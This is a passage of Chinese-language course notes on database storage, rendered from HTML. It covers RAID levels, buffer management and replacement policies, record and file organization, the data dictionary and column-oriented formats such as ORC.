<li>提供比RAID 4更高的I/O速率。</li>
<li>避免了奇偶校验磁盘的瓶颈。</li>
</ul>
</li>
<li>
<p><strong>工作原理</strong> ：使用块交错分布式奇偶校验。数据和奇偶校验分布在所有磁盘上，避免了单一奇偶校验磁盘的瓶颈。</p>
</li>
<li><strong>优点</strong> ：提供高I/O速率和数据冗余，适用于大多数应用。</li>
</ul>
<h4 id="note-db-lec8-raid-level-6">RAID Level 6<a class="headerlink" href="#note-db-lec8-raid-level-6" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-9.png" width="400" />

<figcaption>
RAID 6
</figcaption>
</figure>
<ul>
<li><strong>P+Q冗余方案</strong>：</li>
<li>类似于RAID 5，但存储额外的冗余信息以防止多重磁盘故障。</li>
<li>提供比RAID 5更好的可靠性，但成本更高。</li>
<li><strong>工作原理</strong>：使用P+Q冗余方案，类似于RAID 5，但增加了额外的冗余信息以防止多重磁盘故障。</li>
<li><strong>优点</strong>：提供更高的可靠性，适用于需要极高数据安全性的应用。</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Choosing RAID Levels</p>
<p>选择RAID级别的因素</p>
<ul>
<li><strong>成本</strong> ：考虑经济成本。</li>
<li><strong>性能</strong> ：每秒I/O操作次数和正常操作期间的带宽。</li>
<li><strong>故障期间的性能</strong> ：在磁盘故障期间的性能表现。</li>
<li><strong>故障磁盘重建期间的性能</strong> ：包括重建故障磁盘所需的时间。</li>
</ul>
<p>RAID级别的使用建议</p>
<ul>
<li><strong>RAID 0</strong> ：仅在数据安全性不重要时使用，例如数据可以从其他来源快速恢复。</li>
<li><strong>RAID 1和5</strong> ：主要竞争者。</li>
<li><strong>RAID 1</strong> ：提供更好的写入性能，适用于高更新率环境，如日志磁盘。</li>
<li><strong>RAID 5</strong> ：适用于低更新率和大数据量的应用。</li>
</ul>
<p>不常用的RAID级别</p>
<ul>
<li><strong>RAID 2和4</strong> ：不再使用，因为被RAID 3和5取代。</li>
<li><strong>RAID 3</strong> ：由于比特级条带化需要单块读取所有磁盘，浪费磁盘臂移动，已不再使用。</li>
<li><strong>RAID 6</strong> ：由于RAID 1和5提供了足够的安全性，RAID 6使用较少。</li>
</ul>
<p>其他注意事项</p>
<ul>
<li><strong>RAID 1</strong> ：尽管存储成本较高，但随着磁盘容量的快速增长，成本影响减小。</li>
<li><strong>RAID 5</strong> ：需要至少2次块读取和2次块写入来写入单个块，而RAID 1只需2次块写入。</li>
</ul>
</div>
<h3 id="note-db-lec8-hardware">Hardware<a class="headerlink" href="#note-db-lec8-hardware" title="Permanent link">&para;</a></h3>
<h4 id="note-db-lec8-raid_1">软件RAID<a class="headerlink" href="#note-db-lec8-raid_1" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>定义</strong> ：完全通过软件实现的RAID，不需要特殊的硬件支持。</li>
</ul>
<h4 id="note-db-lec8-raid_2">硬件RAID<a class="headerlink" href="#note-db-lec8-raid_2" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>定义</strong> ：使用特殊硬件实现的RAID。</li>
<li>
<p><strong>特点</strong> ：</p>
</li>
<li>
<p>使用非易失性RAM记录正在执行的写操作。</p>
</li>
<li>注意：写入期间的电源故障可能导致磁盘损坏。</li>
<li>例如，在写入一个块后但在镜像系统中写入第二个块之前发生故障。</li>
<li>这种损坏的数据必须在恢复电源时检测到。</li>
<li>从损坏中恢复类似于从故障磁盘中恢复。</li>
<li>NV-RAM有助于有效检测潜在的损坏块。</li>
<li>否则，必须读取磁盘的所有块并与镜像/奇偶校验块进行比较。</li>
</ul>
<h3 id="note-db-lec8-raid_3">RAID 问题<a class="headerlink" href="#note-db-lec8-raid_3" title="Permanent link">&para;</a></h3>
<h4 id="note-db-lec8-_1">潜在故障<a class="headerlink" href="#note-db-lec8-_1" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Latent failure</p>
</blockquote>
<ul>
<li><strong>定义</strong> ：先前成功写入的数据被损坏。</li>
<li><strong>影响</strong> ：即使只有一个磁盘故障，也可能导致数据丢失。</li>
</ul>
<h4 id="note-db-lec8-_2">数据清理<a class="headerlink" href="#note-db-lec8-_2" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Data scrubbing</p>
</blockquote>
<ul>
<li><strong>定义</strong> ：持续扫描潜在故障，并从副本/奇偶校验中恢复。</li>
</ul>
<h4 id="note-db-lec8-_3">热插拔<a class="headerlink" href="#note-db-lec8-_3" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Hot swap</p>
</blockquote>
<ul>
<li><strong>定义</strong> ：在系统运行时更换磁盘，无需断电。</li>
<li><strong>支持</strong> ：由某些硬件RAID系统支持。</li>
<li><strong>优点</strong> ：减少恢复时间，大大提高可用性。</li>
</ul>
<h4 id="note-db-lec8-_4">备用磁盘<a class="headerlink" href="#note-db-lec8-_4" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Spare disk</p>
</blockquote>
<ul>
<li><strong>定义</strong> ：许多系统维护备用磁盘，在线保持，并在检测到故障时立即用作故障磁盘的替代品。</li>
<li><strong>优点</strong> ：大大减少恢复时间。</li>
</ul>
<h4 id="note-db-lec8-raid_4">硬件RAID系统的可靠性<a class="headerlink" href="#note-db-lec8-raid_4" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Reliability of hardware RAID systems</p>
</blockquote>
<ul>
<li><strong>特点</strong> ：确保单点故障不会停止系统功能。</li>
<li><strong>方法</strong> ：<ul>
<li>使用带电池备份的冗余电源。</li>
<li>使用多个控制器和多重互连以防止控制器/互连故障。</li>
</ul>
</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Optical Disk</p>
<ul>
<li>只读光盘 (CD-ROM，Compact Disc Read Only Memory)<ul>
<li>特点：<ul>
<li>可移动光盘，每张容量640 MB。</li>
<li>寻道时间约为100毫秒（光学读头较重且较慢）。</li>
<li>较高的延迟（3000 RPM）和较低的数据传输速率（3-6 MB/s），相比磁盘。</li>
</ul>
</li>
</ul>
</li>
<li>数字视频光盘 (DVD，Digital Versatile Disc)<ul>
<li>DVD-5：容量4.7 GB，DVD-9：容量8.5 GB。</li>
<li>DVD-10和DVD-18：双面格式，容量分别为9.4 GB和17 GB。</li>
<li>蓝光DVD：27 GB（双面光盘为54 GB）。</li>
<li>寻道时间较慢，原因与CD-ROM相同。</li>
<li>一次写入版本 (CD-R和DVD-R)<ul>
<li>特点：<ul>
<li>数据只能写入一次，不能擦除。</li>
<li>高容量和长寿命；用于档案存储。</li>
</ul>
</li>
</ul>
</li>
<li>多次写入版本（CD-RW、DVD-RW、DVD+RW和DVD-RAM）也可用。</li>
</ul>
</li>
</ul>
</div>
<div class="admonition info">
<p class="admonition-title">Magnetic Tape</p>
<ul>
<li>
<p><strong>大容量和高传输速率</strong>：</p>
</li>
<li>
<p>DAT（数字音频磁带）格式容量为几GB，DLT（数字线性磁带）格式容量为10-40 GB，Ultrium格式容量超过100 GB，Ampex格式容量为330 GB。</p>
</li>
<li>
<p>传输速率从几MB/s到几十MB/s。</p>
</li>
<li>
<p><strong>磁带便宜，但驱动器成本很高</strong>。</p>
</li>
<li>
<p><strong>访问时间非常慢</strong>，与磁盘和光盘相比：</p>
</li>
<li>
<p>仅限于顺序访问。</p>
</li>
<li>
<p>一些格式（如Accelis）提供更快的寻道（几十秒），但容量较低。</p>
</li>
<li>
<p><strong>主要用于备份</strong>，存储不常用的信息，以及作为离线介质在系统之间传输信息。</p>
</li>
<li>
<p><strong>磁带自动机用于超大容量存储</strong>：</p>
</li>
<li>
<p>多个PB（<span class="arithmatex">\(10^{15}\)</span>字节）。</p>
</li>
</ul>
</div>
<h2 id="note-db-lec8-storage-access">Storage Access<a class="headerlink" href="#note-db-lec8-storage-access" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-10.png" width="400" />

<figcaption>
Storage Access
</figcaption>
</figure>
<p>数据库文件被逻辑上划分为固定长度的存储单元，称为块（blocks）;块是数据库系统中存储分配和数据传输的单位。</p>
<p>缓冲区（Buffer）</p>
<ul>
<li>定义：主存中可用来存储磁盘块副本的部分。</li>
<li>目标：数据库系统旨在最小化磁盘和内存之间的块传输次数。</li>
<li>减少磁盘访问次数：通过在主存中保留尽可能多的块来实现——即缓冲区。</li>
<li>限制：缓冲区的大小是有限的。</li>
</ul>
<p>缓冲区管理器（Buffer Manager）</p>
<ul>
<li>职责：负责在主存中分配缓冲区空间的子系统。</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-11.png" width="400" />
</figure>
<p>缓冲池（Buffer Pool）：</p>
<ul>
<li>位于主存中，用于存储磁盘页的副本。</li>
<li>黑色方块表示已占用的磁盘页，白色方块表示空闲帧。</li>
</ul>
<p>页面请求：</p>
<ul>
<li>来自更高层次的请求需要访问数据。</li>
<li>数据必须在RAM中才能被DBMS操作。</li>
</ul>
<p>磁盘（Disk）和数据库（DB）：</p>
<ul>
<li>数据库文件存储在磁盘上。</li>
<li>数据从磁盘加载到缓冲池中。</li>
</ul>
<p>帧选择：</p>
<ul>
<li>由替换策略决定哪个帧用于存储新加载的页面。</li>
</ul>
<p>帧和页的关系：</p>
<ul>
<li>页（Page）：数据的单位。</li>
<li>块（Block）：磁盘空间的单位。</li>
<li>帧（Frame）：缓冲池的单位。</li>
<li>实际上，块和页不完全相同。</li>
</ul>
<p>维护表：</p>
<ul>
<li>维护一个<code>&lt;frame#, pageid&gt;</code>对的表，用于跟踪缓冲池中的数据。</li>
</ul>
<h3 id="note-db-lec8-buffer-management">Buffer Management<a class="headerlink" href="#note-db-lec8-buffer-management" title="Permanent link">&para;</a></h3>
<p>请求块：</p>
<ul>
<li>应用程序需要从磁盘获取块时，会调用缓冲管理器。</li>
</ul>
<p>检查缓冲区：</p>
<ul>
<li>如果块已在缓冲区中：<ul>
<li>请求程序获得块在主存中的地址。</li>
</ul>
</li>
<li>如果块不在缓冲区中：<ul>
<li>缓冲管理器在缓冲区中为块分配空间。</li>
</ul>
</li>
<li>如果没有空闲空间，则替换（丢弃）一些旧页。</li>
</ul>
<p>写回磁盘：</p>
<ul>
<li>被丢弃的块如果被修改过，则写回磁盘。</li>
</ul>
<p>读取新块：</p>
<ul>
<li>一旦在缓冲区中分配了空间，缓冲管理器从磁盘读取块到缓冲区，并将块在主存中的地址传递给请求者。</li>
</ul>
<p>替换策略：</p>
<ul>
<li>使用LRU（最近最少使用）或MRU（最近最多使用）策略。</li>
</ul>
<p>固定块(Pinned Block)：</p>
<ul>
<li>被固定的块不允许写回磁盘，直到使用结束。</li>
</ul>
<p>立即丢弃策略：</p>
<ul>
<li>块的最后一个元组处理完后，立即释放空间。</li>
</ul>
<p>强制输出：
    - 请求者必须解锁块，并指示页面是否被修改。
    - 使用“脏位”标识修改。</p>
<p>页面请求：</p>
<ul>
<li>缓冲池中的页面可能被多次请求。</li>
<li>使用固定计数(Pin Count)，只有当固定计数为0时，页面才是替换的候选。</li>
</ul>
<h3 id="note-db-lec8-buffer-replacement-policies">Buffer-replacement Policies<a class="headerlink" href="#note-db-lec8-buffer-replacement-policies" title="Permanent link">&para;</a></h3>
<ol>
<li><strong>LRU策略（最近最少使用策略）</strong> ：<ul>
<li><strong>原理</strong> ：替换最近最少使用的块。</li>
<li><strong>思路</strong> ：使用过去的块引用模式作为未来引用的预测。</li>
<li><strong>优点</strong> ：适用于有明确访问模式的查询。</li>
<li><strong>缺点</strong> ：对于涉及重复扫描数据的查询，LRU可能表现不佳。</li>
</ul>
</li>
</ol>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-12.png" width="400" />
</figure>
<p>设 M = 5 (buffer has 5 blocks), 1 for borrower, 3 for customer, 1 for out 对customer, LRU的块可能是下面快要用的块(循环)，而最近刚用过的块则暂时不用，当空间不够时倒是可以将其覆盖的, 故LRU策略不佳。</p>
<ol>
<li>
<p><strong>MRU策略（最近最常用策略）</strong> ：</p>
<ul>
<li><strong>原理</strong> ：系统固定当前正在处理的块。</li>
<li><strong>过程</strong> ：块的最后一个元组处理完后，块被解锁，成为最常用的块。</li>
<li><strong>优点</strong> ：适用于某些特定的访问模式。</li>
</ul>
</li>
<li>
<p><strong>统计信息</strong> ：</p>
<ul>
<li>缓冲管理器可以维护统计信息，以提高请求引用特定关系的概率。</li>
<li>例如，数据字典通常被频繁访问。</li>
</ul>
</li>
<li>
<p><strong>强制输出</strong> ：</p>
<ul>
<li>缓冲管理器支持块的强制输出，以便进行恢复。</li>
</ul>
</li>
<li>
<p><strong>混合策略</strong> ：</p>
<ul>
<li>与查询优化器提供的替换策略结合使用。</li>
</ul>
</li>
</ol>
<h2 id="note-db-lec8-file-organization_1">File Organization<a class="headerlink" href="#note-db-lec8-file-organization_1" title="Permanent link">&para;</a></h2>
<p>The database is stored as a collection of files. </p>
<ul>
<li>Each file is a sequence of records. </li>
<li>A record is a sequence of fields. </li>
<li>Two kinds of record: <ul>
<li>Fixed-length records.</li>
<li>Variable-length records. </li>
</ul>
</li>
</ul>
<h3 id="note-db-lec8-fixed-length-records">Fixed-length Records<a class="headerlink" href="#note-db-lec8-fixed-length-records" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>优势：方法简单</strong>：</li>
<li>记录 <span class="arithmatex">\(i\)</span> 从字节 <span class="arithmatex">\(n \times (i - 1)\)</span> 开始存储，其中 <span class="arithmatex">\(n\)</span> 是每个记录的大小。</li>
<li>记录访问简单，但记录可能会跨越块。</li>
</ul>
<p>修改:</p>
<ul>
<li>不允许记录跨越块边界。</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-13.png" width="400" />

<figcaption>
Fixed-length Records
</figcaption>
</figure>
<p>删除记录 <span class="arithmatex">\(i\)</span> 的方法:</p>
<ol>
<li><strong>方法1</strong> ：将记录 <span class="arithmatex">\(i+1\)</span> 到 <span class="arithmatex">\(n\)</span> 向前移动。</li>
<li><strong>方法2</strong> ：将记录 <span class="arithmatex">\(n\)</span> 移动到位置 <span class="arithmatex">\(i\)</span>。</li>
<li><strong>方法3</strong> ：不移动记录，而是将所有空闲记录链接到一个空闲列表（free list）中。</li>
</ol>
<h4 id="note-db-lec8-free-lists">Free Lists<a class="headerlink" href="#note-db-lec8-free-lists" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-14.png" width="400" />

<figcaption>
Free Lists
</figcaption>
</figure>
<p>空闲列表（Free List）</p>
<ul>
<li>存储地址：在文件头中存储第一个被删除记录的地址。</li>
<li>链接记录：使用第一个被删除的记录来存储第二个被删除记录的地址，依此类推。</li>
<li>指针概念：这些存储的地址可以视为指针，因为它们“指向”记录的位置。</li>
<li>优势<ul>
<li>空间效率：更高效的空间表示。</li>
<li>重新利用空闲记录的正常属性空间来存储指针。</li>
<li>使用中的记录中不存储指针。</li>
<li>空闲列表通过链接被删除的记录，优化了存储空间的使用和管理。</li>
</ul>
</li>
</ul>
<h3 id="note-db-lec8-variable-length-records">Variable-length Records<a class="headerlink" href="#note-db-lec8-variable-length-records" title="Permanent link">&para;</a></h3>
<p>出现方式：</p>
<ul>
<li>文件中存储多种记录类型。</li>
<li>允许一个或多个字段具有可变长度的记录类型（如字符串）。</li>
<li>允许重复字段的记录类型（用于一些旧的数据模型）。</li>
</ul>
<p>属性存储：</p>
<ul>
<li>按顺序存储。</li>
<li>可变长度属性用固定大小（偏移量、长度）表示，实际数据存储在所有定长属性之后。</li>
<li>空值用空值位图表示。</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-15.png" width="400" />

<figcaption>
Variable-length Records
</figcaption>
</figure>
<h4 id="note-db-lec8-slotted-page-structure">Slotted Page Structure<a class="headerlink" href="#note-db-lec8-slotted-page-structure" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-16.png" width="400" />

<figcaption>
Slotted Page Structure
</figcaption>
</figure>
<p>结构组成</p>
<ul>
<li>
<p>块头（Block Header）：</p>
<ul>
<li>包含有关页面的元数据</li>
<li>存储记录条目数量</li>
<li>标记空闲空间的结束位置</li>
<li>包含每条记录的位置和大小信息</li>
</ul>
</li>
<li>
<p>槽（Slot）：</p>
<ul>
<li>页头中的一个条目</li>
<li>包含两个关键信息：<ul>
<li>记录长度（记录大小）</li>
<li>记录指针（指向实际记录的位置）</li>
</ul>
</li>
<li>槽的标识形式为：rid = <code>&lt;slot# pid&gt;</code>（记录ID由槽号和页ID组成）</li>
</ul>
</li>
<li>
<p>记录区域：</p>
<ul>
<li>实际存储数据记录的区域</li>
<li>记录从页面尾部开始向前存储（<code>#1, #2, #3, #4</code>）</li>
<li>中间可能有空闲空间</li>
</ul>
</li>
</ul>
<p>工作原理</p>
<ul>
<li>当需要访问记录时，系统首先查找页头中的相应槽</li>
<li>通过槽中的指针找到实际记录位置</li>
<li>记录可以在页面内移动，以保持数据连续性（没有空隙）</li>
<li>移动记录后，只需更新页头中的槽信息，而不需要更新外部指针</li>
<li>指针不应直接指向记录，而应指向头中的记录条目（间接指针）。</li>
</ul>
<h3 id="note-db-lec8-representation">Representation<a class="headerlink" href="#note-db-lec8-representation" title="Permanent link">&para;</a></h3>
<h4 id="note-db-lec8-reserved-space">保留空间（Reserved Space）<a class="headerlink" href="#note-db-lec8-reserved-space" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-17.png" width="400" />

<figcaption>
Reserved Space
</figcaption>
</figure>
<p>原理</p>
<ul>
<li>使用已知最大长度的定长记录</li>
<li>为每条记录分配固定大小的空间</li>
<li>较短记录中的未使用空间用空值或记录结束符填充</li>
</ul>
<p>特点</p>
<ul>
<li><strong>简单性</strong>：实现和管理简单直接</li>
<li><strong>预测性</strong>：记录位置可以通过简单公式计算</li>
<li><strong>存取效率</strong>：随机访问速度快，无需额外索引</li>
<li><strong>空间浪费</strong>：短记录会造成空间浪费</li>
<li><strong>限制性</strong>：对超过预定最大长度的记录无法处理</li>
</ul>
<p>应用场景</p>
<ul>
<li>记录长度变化不大的数据</li>
<li>对随机访问性能要求高的应用</li>
<li>简单数据结构的存储</li>
</ul>
<h4 id="note-db-lec8-pointers">指针（Pointers）<a class="headerlink" href="#note-db-lec8-pointers" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-18.png" width="400" />

<figcaption>
Pointers
</figcaption>
</figure>
<p>原理</p>
<ul>
<li>使用指针指向实际数据的位置</li>
<li>可以是直接指针（指向实际数据）或间接指针（指向中间结构）</li>
</ul>
<p>特点</p>
<ul>
<li><strong>灵活性</strong>：支持任意长度的记录</li>
<li><strong>空间效率</strong>：可以减少空间浪费</li>
<li><strong>复杂性</strong>：实现和管理相对复杂</li>
<li><strong>性能开销</strong>：访问数据需要额外的指针解析步骤</li>
</ul>
<p>应用场景</p>
<ul>
<li>记录长度差异大的数据</li>
<li>存储大型对象或文档</li>
<li>需要灵活空间管理的应用</li>
</ul>
<p><strong>空间浪费</strong>：除了链中的第一条记录外，所有记录中都有浪费的空间（用于分支名称），这意味着在溢出链中的记录结构可能包含未使用的字段，造成存储效率降低</p>
<p>解决方案：</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-19.png" width="400" />

<figcaption>
Pointer Structure
</figcaption>
</figure>
<p>通过在文件中使用两种不同类型的块：</p>
<ol>
<li>
<p><strong>锚块（Anchor Block，锚块）</strong>：</p>
<ul>
<li>包含链中的第一条记录</li>
<li>这些记录需要存储完整信息，包括分支名称等所有字段</li>
<li>通常是哈希表的主要存储区域</li>
</ul>
</li>
<li>
<p><strong>溢出块（Overflow Block，溢出块）</strong>：</p>
<ul>
<li>包含除链中第一条记录以外的其他记录</li>
<li>这些记录可以使用更紧凑的结构，省略不必要的字段</li>
<li>专门设计用于存储冲突记录</li>
</ul>
</li>
</ol>
<p>溢出记录不再需要存储冗余信息，结构优化：可以为不同用途的记录设计专门的结构，性能提升：更紧凑的记录意味着每个块可以存储更多记录，减少I/O操作</p>
<div class="admonition summary">
<p class="admonition-title">两种方法的比较</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>保留空间</th>
<th>指针</th>
</tr>
</thead>
<tbody>
<tr>
<td>实现复杂度</td>
<td>低</td>
<td>中到高</td>
</tr>
<tr>
<td>空间利用率</td>
<td>低到中</td>
<td>中到高</td>
</tr>
<tr>
<td>访问速度</td>
<td>快</td>
<td>较慢（需解析指针）</td>
</tr>
<tr>
<td>记录长度灵活性</td>
<td>有限</td>
<td>高</td>
</tr>
<tr>
<td>更新操作效率</td>
<td>高（原地更新）</td>
<td>可能需要重定位</td>
</tr>
</tbody>
</table>
<p>保留空间方法更适合记录长度相对固定且对访问速度要求高的场景，而指针方法则更适合处理变长记录和需要高空间利用率的情况。</p>
</div>
<h2 id="note-db-lec8-organization-of-records-in-files">Organization of Records in Files<a class="headerlink" href="#note-db-lec8-organization-of-records-in-files" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Heap file (堆文件, 流水文件):a record can be placed anywhere in the file where there is space,有空间就可以放</p>
</li>
<li>
<p>Sequential file (顺序文件):store records in sequential order, based on the value of a search key of each record ，根据搜索键的值存储记录</p>
</li>
<li>
<p>Hashing file (散列文件):a hash function computed on some attribute of each record; the result specifies in which block of the file the record should be placed ，根据每个记录的某个属性计算散列值，结果指定记录应该存储在文件的哪个块中</p>
</li>
<li>
<p>Clustering file organization (聚集文件组织):records of several different relations can be stored in the same file ，几个不同的关系的记录可以存储在同一个文件中</p>
<blockquote>
<p>Motivation: store related records in different relations on the same block to minimize I/O ，在同一个块中存储相关记录以最小化I/O操作</p>
</blockquote>
</li>
</ul>
<h3 id="note-db-lec8-sequential-file-organization">Sequential File Organization<a class="headerlink" href="#note-db-lec8-sequential-file-organization" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-20.png" width="400" />

<figcaption>
Sequential File Organization
</figcaption>
</figure>
<ul>
<li>适用于：需要对整个文件进行顺序处理的应用</li>
<li>数据排序：文件中的记录按搜索键排序（如图中按账号-分支名排序）</li>
<li>唯一性：一个顺序文件只有一个搜索键</li>
<li>操作机制</li>
<li>删除操作
    使用指针链（pointer chains）处理删除
    被删除的记录位置可通过指针链接起来形成空闲列表</li>
<li>插入操作</li>
</ul>
<p>需要找到记录应该插入的正确位置（保持排序顺序）</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-21.png" width="400" />

<figcaption>
Insertion in Sequential File
</figcaption>
</figure>
<p>插入策略：</p>
<ul>
<li>如果插入位置有空闲空间，直接插入</li>
<li>如果没有空闲空间，将记录插入溢出块</li>
<li>
<p>在任何情况下，都需要更新指针链</p>
</li>
<li>
<p>文件重组:随着插入和删除操作的频繁进行，文件的顺序性会下降;需要定期重新组织文件以恢复顺序
重组过程消耗资源，但能提高后续访问效率</p>
</li>
</ul>
<h3 id="note-db-lec8-multitable-clustering">Multitable Clustering<a class="headerlink" href="#note-db-lec8-multitable-clustering" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-22.png" width="400" />

<figcaption>
Multitable Clustering
</figcaption>
</figure>
<p>多关系存储：</p>
<ul>
<li>在一个文件中存储多个关系表（如图中的department和instructor表）</li>
<li>数据按照关系间的连接属性进行排序和组织</li>
</ul>
<p>物理布局：</p>
<ul>
<li>首先是逻辑表视图：department表和instructor表分别展示</li>
<li>然后是物理存储视图：department和instructor记录交错存储，按关系聚类</li>
</ul>
<p>聚类方式：</p>
<ul>
<li>相关记录物理上相邻（如Comp.Sci.部门记录后紧跟该部门的所有教师记录）</li>
<li>每个部门的记录块后面是属于该部门的所有教师记录</li>
</ul>
<p>优缺点：</p>
<ul>
<li>
<p>优点</p>
<ul>
<li>适合联合查询：<ul>
<li>对涉及department和instructor的连接查询效率高</li>
<li>对查询单个部门及其所有教师的操作性能好</li>
<li>减少磁盘I/O，因为相关数据物理上相近</li>
</ul>
</li>
<li>可扩展性：<ul>
<li>支持可变大小的记录</li>
</ul>
</li>
</ul>
</li>
<li>
<p>缺点</p>
<ul>
<li>单表查询劣势：<ul>
<li>对仅涉及department表的查询效率低，可以添加指针链来链接特定关系的记录</li>
<li>必须扫描整个文件来定位所有部门记录</li>
</ul>
</li>
<li>复杂度：<ul>
<li>插入和删除操作复杂</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-23.png" width="400" />

<figcaption>
Pointer Relation
</figcaption>
</figure>
<blockquote>
<p>添加指针连接department关系，这样可优化对于department表的查询</p>
</blockquote>
<p>维护聚类结构需要额外开销</p>
<h2 id="note-db-lec8-data-dictionary-storage">Data-Dictionary Storage<a class="headerlink" href="#note-db-lec8-data-dictionary-storage" title="Permanent link">&para;</a></h2>
<p>Data dictionary (also called system catalog) stores metadata:  that is, data about data, such as:</p>
<ul>
<li>
<p>Information about relations</p>
<ul>
<li>Names of relations</li>
<li>Names and types of attributes of each relation</li>
<li>Names and definitions of views</li>
<li>Integrity constraints</li>
</ul>
</li>
<li>
<p>User and accounting information, including passwords</p>
</li>
<li>
<p>Statistical and descriptive data</p>
<ul>
<li>Number of tuples in each relation</li>
</ul>
</li>
<li>
<p>Physical file organization information</p>
<ul>
<li>How relation is stored (sequential/hash/...)</li>
<li>Physical location of relation</li>
<li>Operating system file name or</li>
<li>Disk addresses of blocks containing records of the relation</li>
</ul>
</li>
<li>Information about indices </li>
</ul>
<h3 id="note-db-lec8-relational-representation-of-system-metadata">Relational Representation of System Metadata<a class="headerlink" href="#note-db-lec8-relational-representation-of-system-metadata" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-24.png" width="400" />

<figcaption>
Relational Representation of System Metadata
</figcaption>
</figure>
<ul>
<li>关系表示法：<ul>
<li>关系表示法是一种用于存储和管理元数据的结构化方式</li>
<li>关系表示法将元数据存储在关系数据库中，每个关系表示一个元数据实体</li>
<li>关系表示法可以方便地进行查询和更新</li>
</ul>
</li>
</ul>
<h3 id="note-db-lec8-column-oriented-storage">Column-Oriented Storage<a class="headerlink" href="#note-db-lec8-column-oriented-storage" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-25.png" width="400" />

<figcaption>
Column-Oriented Storage
</figcaption>
</figure>
<p>列式存储，也称为列式表示（columnar representation），是一种数据库表的物理存储方法，与传统的行式存储截然不同。</p>
<p>基本概念</p>
<ul>
<li>核心思想：分别存储关系表的每个属性（列）</li>
<li>存储方式：相同列的数据被连续存储在一起，而不是将一行数据存储在一起</li>
</ul>
<p>图中示例展示了一个表格，分为四列（可能是员工ID、姓名、部门和薪资）：</p>
<ul>
<li>每一列单独存储（如ID列：10101, 12121, 15151...）</li>
<li>姓名列单独存储（Srinivasan, Wu, Mozart...）</li>
<li>部门列单独存储（Comp. Sci., Finance, Music...）</li>
<li>薪资列单独存储（65000, 90000, 40000...）</li>
</ul>
<p>列式存储的优势</p>
<ul>
<li>减少I/O量：<ul>
<li>当查询只需访问少量列时，可以只读取需要的列</li>
<li>避免读取不需要的数据，显著减少I/O操作</li>
</ul>
</li>
<li>改善CPU缓存性能：<ul>
<li>同质数据连续存储增强数据局部性</li>
<li>更好地利用CPU缓存，减少缓存未命中</li>
</ul>
</li>
<li>更好的压缩效率：<ul>
<li>同一列的数据通常具有相似性，压缩效率更高</li>
<li>可以应用专门针对列数据特性的压缩算法</li>
</ul>
</li>
<li>支持向量处理：<ul>
<li>适合现代CPU架构的SIMD（单指令多数据）操作</li>
<li>能同时对多个数据元素进行相同操作</li>
</ul>
</li>
</ul>
<p>列式存储的缺点</p>
<ul>
<li>元组重构成本：<ul>
<li>需要从多个列中重新组合数据以重建完整行</li>
<li>增加查询处理复杂性</li>
</ul>
</li>
<li>更新和删除操作成本：<ul>
<li>修改一行数据需要修改多个不同的存储位置</li>
<li>使更新操作更加复杂</li>
</ul>
</li>
<li>解压缩成本：<ul>
<li>访问压缩数据需要额外的解压缩步骤</li>
</ul>
</li>
</ul>
<p>应用场景</p>
<ul>
<li>决策支持系统：列式存储被证明比行式存储更高效</li>
<li>事务处理：传统行式存储更适合</li>
<li>混合系统：一些数据库支持混合行列存储，称为混合行/列存储</li>
<li>列式存储特别适合分析型工作负载（OLAP），如数据仓库和商业智能应用，这些应用通常只需访问少量列但需要处理大量行数据。</li>
</ul>
<h4 id="note-db-lec8-representation_1">Representation<a class="headerlink" href="#note-db-lec8-representation_1" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-26.png" width="400" />

<figcaption>
ORC
</figcaption>
</figure>
<p>ORC和Parquet：两种流行的列式存储文件格式,这些格式在文件内部采用列式存储方式</p>
<p>图中展示了ORC文件格式的结构</p>
<p>应用场景：</p>
<ul>
<li>非常适合大数据应用</li>
<li>被广泛应用于数据仓库和分析系统</li>
</ul>
<p>ORC文件结构：</p>
<ul>
<li>文件分条带(Stripe)：整个文件被分为多个条带（Stripe 1, Stripe 2, ..., Stripe n）</li>
<li>每个条带包含：<ul>
<li>索引数据(Index Data)：存储每列的统计信息和位置信息</li>
<li>行数据(Row Data)：按列组织的实际数据</li>
<li>条带页脚(Stripe Footer)：包含条带的元数据</li>
</ul>
</li>
</ul>
<p>内部组织：</p>
<ul>
<li>每列数据单独存储（Col1, Col2, Col3等）</li>
<li>数据分为索引部分（Col1 Index, Col2 Index等）和数据部分（Col1 Data, Col2 Data等）</li>
<li>最下方有文件页脚(File Footer)，包含整个文件的元数据</li>
</ul></section><section class="print-page" id="note-db-indexing" heading-number="2.2.1.8"><h1 id="note-db-indexing-indexing-and-hashing">Indexing and Hashing<a class="headerlink" href="#note-db-indexing-indexing-and-hashing" title="Permanent link">&para;</a></h1>
